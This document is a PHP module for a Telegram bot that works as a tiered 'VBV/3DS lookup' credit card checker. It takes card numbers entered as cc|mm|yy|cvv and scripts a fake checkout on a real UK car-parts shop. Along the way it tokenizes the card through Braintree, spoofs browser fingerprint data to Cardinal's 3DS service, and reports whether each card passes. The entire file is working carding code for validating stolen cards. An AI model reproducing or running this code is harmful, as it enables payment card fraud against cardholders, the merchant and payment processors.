<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";
$gate = " BRAINTREE 3D LookUp";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";

$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
//========WHO CAN CHECK FUNC========//
if (preg_match('/^(\/vbv|\.vbv|!vbv)/', $text)) {
    $userid = $update['message']['from']['id'];
    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> $userlink You're not Premium user❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);
    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    //=======WHO CAN CHECK END========//
    //====ANTISPAM AND WRONG FORMAT====//
    if (strlen($text) <= 5) {
        sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/vbv cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>3DS Lookup</code>', $message_id);
        exit();
    }
    // Check if the user is allowed to submit the message

    //==ANTISPAM AND WRONG FORMAT END==//
    //=======checker part start========//
    if ($_SERVER['REQUEST_METHOD'] == "POST") {
        extract($_POST);
    } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
        extract($_GET);
    }
    function inStr($string, $start, $end, $value) {
        $str = explode($start, $string);
        $str = explode($end, $str[$value]);
        return $str[0];
    }
    $lista = substr($text, 5);
    $separa = explode("|", $lista);
    $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
    $mes = isset($separa[1]) ? $separa[1] : '';
    $ano = isset($separa[2]) ? $separa[2] : '';
    $cvv = isset($separa[3]) ? $separa[3] : '';
    $last4 = substr($cc, 12, 16);
    $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>REVIEWING YOU'RE REQUEST ✅</b>");
    function value($str, $find_start, $find_end) {
        $start = @strpos($str, $find_start);
        if ($start === false) {
            return "";
        }
        $length = strlen($find_start);
        $end = strpos(substr($str, $start + $length), $find_end);
        return trim(substr($str, $start + $length, $end));
    }
    function mod($dividendo, $divisor) {
        return round($dividendo - (floor($dividendo / $divisor) * $divisor));
    }
    //================[Functions and Variables]================//
    function vbv($input) {
        // Replace underscores with spaces
        $output = str_replace('_', ' ', $input);
        // Convert to title case (first letter uppercase, rest lowercase)
        $output = ucwords(strtolower($output));
        return $output;
    }
    #------[CC Type Randomizer]------#
    $cardNames = array("3" => "American Express", "4" => "Visa", "5" => "MasterCard", "6" => "Discover");
    $card_type = $cardNames[substr($cc, 0, 1) ];

    //==================[BIN LOOK-UP]======================//
     //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

  //IF BIN ARE NOT AVAILABLE ----//
  if (empty($bininfo)) {
      $bininfo = "N/A";
  }
  if (empty($bin)) {
      $bin = "N/A";
  }
  if (empty($country)) {
      $country = "N/A";
  }
  if (empty($bank)) {
      $bank = "N/A";
  }
  if (empty($country)) {
      $country = "N/A";
  }
  if (empty($emoji)) {
      $emoji = "N/A";
  }
  if (empty($currency)) {
      $currency = "N/A";
  }


    //------------Card info------------//
    sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
[×] PROCESS - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");

    //-------------------Req 1--------------//
#01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/basket/addproduct');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ProductID":652646,"Quantity":1,"SourceURL":"https://www.design911.co.uk/porsche/boxster-986-987-981/brakes---discs---pads/"}');
$curl1 = curl_exec($ch);



#02 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/checkout/proceed');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ShippingAddress":{"$type":"Ecomm.Domain.LocalisedBasketAddress, Ecomm.Domain","RegionName":"","CountryName":"United Kingdom","CountryCode":"GB","ZoneName":"UK","ZoneID":398,"Name":{"$type":"Ecomm.Domain.ContactName, Ecomm.Domain","Title":"","FirstName":"Jack","Surname":"Coddrey"},"Company":"","Line1":"G, Tamar Court","Line2":"Amethyst Lane, ","Line3":"Reading","Line4":"Berkshire","PostalCode":"RG30 2EZ","RegionID":-1,"CountryID":1491},"BillingAddress":{"$type":"Ecomm.Domain.LocalisedBasketAddress, Ecomm.Domain","RegionName":"","CountryName":"United Kingdom","CountryCode":"GB","ZoneName":"UK","ZoneID":398,"Name":{"$type":"Ecomm.Domain.ContactName, Ecomm.Domain","Title":"","FirstName":"Jack","Surname":"Coddrey"},"Company":"","Line1":"G, Tamar Court","Line2":"Amethyst Lane, ","Line3":"Reading","Line4":"Berkshire","PostalCode":"RG30 2EZ","RegionID":-1,"CountryID":1491},"CustomerEmail":"dfbdfgtrbrgf@gmail.com","CustomerTelephone":"4254353455","CreateAccount":false,"Password":"","DeliveryOption":"delivery","ExistingOrderNumber":"","CarModel":"","CarType":"","CarYear":"","CarEngineSize":"","CarBodyType":"","CarSteering":"Right Hand Drive","CarTransmission":"Automatic","CarVinChassisNo":"","Comments":"","HowHeard":"INTERNET ORDER","NewsletterSignup":false,"VATNumber":"","VATName":"","VATAddress":"","NPWPNumber":"","SingaporeGST":"","AustraliaGST":""}');
$curl2 = curl_exec($ch);


        sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
[×] PROCESS - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");

#03 Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/order-payment/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
'content-type: application/x-www-form-urlencoded',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl3 = curl_exec($ch);
$Token = trim(strip_tags(getStr($curl3,'client-token="','"')));
$decode = base64_decode($Token);
$fpt = trim(strip_tags(getStr($decode,'authorizationFingerprint":"','"')));



# 04 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'braintree-version: 2018-05-10',
'authorization: Bearer '.$fpt.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6704978b-10fd-4b37-b317-ba4fb7edc535"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}');
$curl4 = curl_exec($ch);
$JWT = trim(strip_tags(getStr($curl4,'cardinalAuthenticationJWT":"','"')));

# 05 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'braintree-version: 2018-05-10',
'authorization: Bearer '.$fpt.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6704978b-10fd-4b37-b317-ba4fb7edc535"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl5 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl5,'token":"','"')));

# 06 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json;charset=UTF-8',
'X-Cardinal-Tid: Tid-223066d9-7fe1-48e4-a2fd-5d8ec18d3752',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"BrowserPayload":{"Order":{"OrderDetails":{},"Consumer":{"BillingAddress":{},"ShippingAddress":{},"Account":{}},"Cart":[],"Token":{},"Authorization":{},"Options":{},"CCAExtension":{}},"SupportsAlternativePayments":{"cca":true,"hostedFields":false,"applepay":false,"discoverwallet":false,"wallet":false,"paypal":false,"visacheckout":false}},"Client":{"Agent":"SongbirdJS","Version":"1.35.0"},"ConsumerSessionId":null,"ServerJWT":"'.$JWT.'"}');
$curl6 = curl_exec($ch);
$JWT2 = trim(strip_tags(getStr($curl6,'CardinalJWT":"','"')));
$PARSED = trim(strip_tags(getStr($JWT2,'.','_')));
$DECODED = base64_decode($PARSED);
$Ref = trim(strip_tags(getStr($DECODED,'ReferenceId":"','"')));
$aud = trim(strip_tags(getStr($DECODED,'"aud":"','"')));


    sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
[×] PROCESS - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");
    //==================req 2===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Origin: https://geo.cardinalcommerce.com',
'Referer: https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5fa1f5b15ea84a4680f871ec&tmEventType=PAYMENT&referenceId='.$Ref.'&geolocation=false&origin=Songbird',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Cookies":{"Legacy":true,"LocalStorage":true,"SessionStorage":true},"DeviceChannel":"Browser","Extended":{"Browser":{"Adblock":true,"AvailableJsFonts":[],"DoNotTrack":"unknown","JavaEnabled":false},"Device":{"ColorDepth":24,"Cpu":"unknown","Platform":"Win32","TouchSupport":{"MaxTouchPoints":0,"OnTouchStartAvailable":false,"TouchEventCreationSuccessful":false}}},"Fingerprint":"650ee8ce8cff72221cd04b87223780ef","FingerprintingTime":704,"FingerprintDetails":{"Version":"1.5.1"},"Language":"en-US","Latitude":null,"Longitude":null,"OrgUnitId":"5c994f9dccef763068cf8831","Origin":"Songbird","Plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"ReferenceId":"'.$Ref.'","Referrer":"https://www.design911.co.uk/","Screen":{"FakedResolution":false,"Ratio":1.7777777777777777,"Resolution":"1536x864","UsableResolution":"1536x816","CCAScreenSize":"02"},"CallSignEnabled":null,"ThreatMetrixEnabled":false,"ThreatMetrixEventType":"PAYMENT","ThreatMetrixAlias":"Default","TimeOffset":-330,"UserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","UserAgentDetails":{"FakedOS":false,"FakedBrowser":false}}');
$curl8 = curl_exec($ch);

# 10 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/kxwr8p3g8df6b3wp/client_api/v1/payment_methods/'.$pid.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Origin: https://gasgrab.com',
'Referer: https://gasgrab.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":49.14,"additionalInfo":{"acsWindowSize":"03","billingLine1":"G, Tamar Court","billingLine2":"Amethyst Lane, ","billingCity":"Reading","billingPostalCode":"RG30 2EZ","billingCountryCode":"GB","billingPhoneNumber":"4254353455","billingGivenName":"Jack","billingSurname":"Coddrey","shippingLine1":"G, Tamar Court","shippingLine2":"Amethyst Lane, ","shippingCity":"Reading","shippingPostalCode":"RG30 2EZ","shippingCountryCode":"GB","email":"dfbdfgtrbrgf@gmail.com"},"bin":"515676","dfReferenceId":"'.$Ref.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.86.0","cardinalDeviceDataCollectionTimeElapsed":1094,"issuerDeviceDataCollectionTimeElapsed":1429,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$fpt.'","braintreeLibraryVersion":"braintree/web/3.86.0","_meta":{"merchantAppId":"www.design911.co.uk","platform":"web","sdkVersion":"3.86.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"6704978b-10fd-4b37-b317-ba4fb7edc535"}}');
$curl10 = curl_exec($ch);

$Status = trim(strip_tags(getStr($curl10,'status":"','"')));
$nonce = trim(strip_tags(getStr($curl10,'nonce":"','"')));

#11 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/order-payment/dopayment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Nonce":"'.$nonce.'","DeviceData":"{\"device_session_id\":\"fad45573ff51c341dfaa518b4c789158\",\"fraud_merchant_id\":null,\"correlation_id\":\"fdb202df7b068212814e2de659eb28a3\"}","LocalPaymentID":"","ReferenceID":""}');
$curl11 = curl_exec($ch);
$rsppppp = trim(strip_tags(getStr($curl11,'FailureReason":"','"')));

if ((strpos($curl11, 'IsSuccess":true')) or (strpos($curl11, 'IsSuccess":true')) or (strpos($curl11, 'Insufficient Funds')));


    //==================req 2 end===============//

    sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
[×] PROCESS - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");
    $end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);
    //======checker part end=========//

if (strpos($Status, 'successful')){
  $Status = "Authenticate Successful";
  $pa = "Passsed ✅";
}
else {$Status = "$Status";
        $pa = "Rejected ❌";
       }

  


    if (strpos($curl11, 'authenticate_successful')) {
        $response = "Card ⪼ $lista
Status ⪼$pa
Result ⪼$Status
Gateway ⪼$gate
══════ ⋆Bin Info⋆ ══════
Bin ⪼ $bininfo
Bank ⪼ $bank
Country ⪼ $country
═══════ ⋆Data⋆ ═══════
Test Time ⪼ $time
Proxy ⪼ Live ✅
Checked By ⪼@$username [$rank]";
        sleep(1);
        edit_sent_message($chatId, $sent_message_id, $response);

        } else {
        $response = "Card ⪼ $lista
Status ⪼$pa
Result ⪼$Status
Gateway ⪼$gate
══════ ⋆Bin Info⋆ ══════
Bin ⪼ $bininfo
Bank ⪼ $bank
Country ⪼ $country
═══════ ⋆Data⋆ ═══════
Test Time ⪼ $time
Proxy ⪼ Live ✅
Checked By ⪼@$username [$rank]";
        sleep(1);
        edit_sent_message($chatId, $sent_message_id, $response);
    }
}